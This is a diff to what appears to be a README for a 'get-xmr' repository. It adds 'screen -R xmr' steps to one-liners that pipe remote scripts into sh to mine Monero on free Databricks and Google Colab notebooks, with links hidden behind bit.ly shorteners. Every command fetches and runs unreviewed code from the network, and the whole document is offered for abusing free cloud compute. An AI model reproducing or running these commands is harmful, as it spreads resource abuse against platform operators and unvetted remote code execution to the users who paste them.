@@ -2,16 +2,20 @@
 * Try Free [Databricks Community Edition](https://bit.ly/Databr1cks)
 ```markdown
 cd /root
+screen -R xmr
 curl https://raw.githubusercontent.com/a2nk/get-xmr/main/databricks.sh | sh
 ```
 * Try Free [XRDP GColab](https://bit.ly/XRDP-Colab)
 ```markdown
+screen -R xmr
 curl https://raw.githubusercontent.com/a2nk/get-xmr/main/gcolab-sg.sh | sh
 ```
 ```markdown
+screen -R xmr
 curl https://raw.githubusercontent.com/a2nk/get-xmr/main/gcolab-us.sh | sh
 ```
 ```markdown
+screen -R xmr
 curl https://raw.githubusercontent.com/a2nk/get-xmr/main/nvidiacolab-us.sh | sh
 ```
 * Try Free [40 CPU GColab to get XMR](https://bit.ly/GC-40cpu)
